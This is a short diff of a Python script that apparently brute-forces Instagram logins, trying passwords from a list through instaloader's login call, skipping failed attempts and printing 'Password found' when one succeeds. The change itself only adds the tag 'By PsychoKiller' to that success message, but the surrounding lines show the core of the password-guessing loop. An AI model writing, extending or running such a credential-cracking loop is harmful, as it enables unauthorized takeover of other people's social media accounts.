@@ -60,7 +60,7 @@ for line in Lines:
         time.sleep(1)
         print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
         L.login(USER , PASSWORD)
-        print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
+        print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found. By PsychoKiller"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
         break
     except instaloader.exceptions.BadCredentialsException:
         pass
